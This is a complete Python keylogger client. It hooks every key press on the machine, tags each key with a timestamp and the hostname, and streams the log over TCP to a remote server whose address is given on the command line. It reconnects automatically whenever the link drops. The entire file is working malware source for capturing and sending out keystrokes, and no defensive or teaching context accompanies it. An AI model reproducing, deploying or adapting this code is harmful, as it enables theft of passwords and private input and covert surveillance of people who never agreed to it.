import keyboard
import socket
import time
from datetime import datetime
import sys

class KeyloggerClient:
    def __init__(self, server_host='127.0.0.1', server_port=5555):
        self.server_host = server_host
        self.server_port = server_port
        self.client_socket = None
        self.running = False
        self.connected = False
        self.retry_interval = 5  # Seconds between connection retry attempts
        
    def connect_to_server(self):
        """Connect to the keylogger server"""
        while self.running and not self.connected:
            try:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect((self.server_host, self.server_port))
                self.connected = True
                print(f"[+] Connected to server at {self.server_host}:{self.server_port}")
            except socket.error as e:
                print(f"[!] Failed to connect to server: {e}")
                print(f"[*] Retrying in {self.retry_interval} seconds...")
                time.sleep(self.retry_interval)
    
    def on_key_press(self, event):
        """Function called on keyboard press event"""
        if not self.connected:
            return
            
        key = event.name
        
        # Format special keys to be more readable
        if len(key) > 1:
            if key == "space":
                key = "SPACE"
            elif key == "enter":
                key = "ENTER"
            elif key == "tab":
                key = "TAB"
            elif key == "backspace":
                key = "BACKSPACE"
            elif key == "shift":
                key = "SHIFT"
            elif key == "ctrl":
                key = "CTRL"
            elif key == "alt":
                key = "ALT"
                
        # Get current timestamp and hostname
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        hostname = socket.gethostname()
        
        # Format the log entry
        log_entry = f"{timestamp} | Host: {hostname} | Key: {key}\n"
        
        # Send the log entry to the server
        try:
            self.client_socket.send(log_entry.encode('utf-8'))
        except socket.error:
            print("[!] Connection to server lost")
            self.connected = False
            # Try to reconnect
            self.connect_to_server()
    
    def start(self):
        """Start the keylogger client"""
        print("Keylogger client starting...")
        self.running = True
        
        # Connect to server
        self.connect_to_server()
        
        # Register the key press event handler
        keyboard.on_press(self.on_key_press)
        
        print("Keylogger started. Press Ctrl+C to stop.")
        
        try:
            # Keep the program running
            while self.running:
                # If connection is lost, try to reconnect
                if not self.connected:
                    self.connect_to_server()
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the keylogger client"""
        self.running = False
        
        # Close connection to server
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        
        print("\nKeylogger client stopped.")

if __name__ == "__main__":
    # If server address is provided as command line argument, use it
    server_host = '127.0.0.1'  # Default to localhost
    server_port = 5555  # Default port
    
    if len(sys.argv) >= 2:
        server_host = sys.argv[1]
    if len(sys.argv) >= 3:
        server_port = int(sys.argv[2])
    
    client = KeyloggerClient(server_host, server_port)
    client.start()